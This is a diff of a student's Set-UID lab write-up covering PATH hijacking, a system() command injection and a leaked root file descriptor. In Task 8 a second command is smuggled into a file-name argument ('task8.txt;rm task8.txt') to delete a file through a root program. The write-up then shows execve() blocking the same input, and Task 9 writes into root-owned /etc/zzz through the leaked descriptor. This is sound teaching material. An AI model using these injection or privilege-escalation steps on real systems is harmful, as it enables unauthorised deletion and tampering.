@@ -13,9 +13,9 @@ The SET_UID program the calling process's environment, but the system's secure e
 TASK 6:
 After compiling the program and following the steps from the previous task to change its owner to root, and make it a Set-UID program with the following instructions:
 
-   $ gcc mynewset.c (name of the program)
-   $ sudo chown root a.out (changing the exacutable output of the program to root)
-   $ sudo chmod 4755 a.out (making it a SET-UID program)
+   $ gcc mynewset.c -o mynewset (name of the program)
+   $ sudo chown root mynewset (changing the exacutable output of the program to root)
+   $ sudo chmod 4755 mynewset (making it a SET-UID program)
 
 A new directory needs to be created. Here I chose the name malicious, and put it in front of PATH:
 
@@ -41,14 +41,68 @@ ls.c then needs to be compiled:
 ???
 
 TASK 8:
-step 1 - Like the previous task, we'll run the program catall.c, change its owner to root, and make it a Set-UID program with the following instructions:
+step 1 - Like the previous task, we'll compile the program catall.c, change its owner to root, and make it a Set-UID program with the following instructions:
 
    $ gcc catall.c -o catall
    $ sudo chown root catall
    $ sudo chmod 4755 catall
 
-We can now create a non-writable, root-owned file to test out code, with the following command:
+We now need to create a file for us to read inside, for which I'll choose the name "task8.txt", with the following command:
 
- $ sudo sh -c 'echo "lab test" > /tmp/lab_test_file && chown root:root /tmp/lab_test_file && chmod 644 /tmp/lab_test_file'
- ???
+   $ echo "Bob can't change this." > task8.txt
 
+Which can be read using:
+
+   $ ./catall "task8.txt"
+
+However, because of the use of the system() function, this file can be easily removed by using the same call, but adding the remove command afterwards:
+
+   $ ./catall "task8.txt;rm task8.txt"
+
+Which will first read the file as asked, and will then remove it, making any call of said file return "task8.txt: No such file or directory"
+
+This is one of the vulnerabilities of the function system().
+
+step 2 - After commenting the system() statement and uncommenting the execve() statement, we now need to compile the program catall.c again, change its owner to root, and make it a Set-UID program with the following instructions:
+
+   $ gcc catall.c -o catallnew
+   $ sudo chown root catallnew
+   $ sudo chmod 4755 catallnew
+
+Again, we'll create another file with the same name and content as before using the same command:
+
+   $ echo "Bob can't change this." > task8.txt
+
+For which, our new catall program can still read using the command:
+
+   $ ./catallnew "task8.txt"
+
+   However, this time around, using the same command we exploited before to remove the file:
+
+   $ ./catallnew "task8.txt;rm task8.txt"
+
+We won't be able to execute the command. The file won't be read and it won't removed either, receiving the following message:
+"'task8.txt;rm task8.txt': No such file or directory"
+
+This shows that the function execve() only allows the file to be read, fixing the vulnerability used for the previous attack when the program still used the function system().
+
+TASK9
+We'll start things off by creating the /etc/zzz file that will be used in the code, with root ownership and permissions. To do that, we'll use the following commands:
+
+   $ sudo touch /etc/zzz
+   $ sudo chown root:root /etc/zzz (changing not only the owner but the user group)
+   $ sudo chmod 0644 /etc/zzz
+
+Now we need to compile the program cap_leak.c, change its owner to root, and make it a Set-UID/GID program with the following instructions:
+
+   $ gcc cap_leak.c -o capleak
+   $ sudo chown root:root capleak
+   $ sudo chmod +s capleak
+
+Now running the program with "./capleak" it returns "fd is 3"
+
+We are now able to easily write in the "/etc/zzz" using the echo command:
+
+   $ echo "I'm writing inside this file" >&3
+
+Which using "$ cat /etc/zzz" returns: "I'm writing inside this file", the exact message we had written inside.
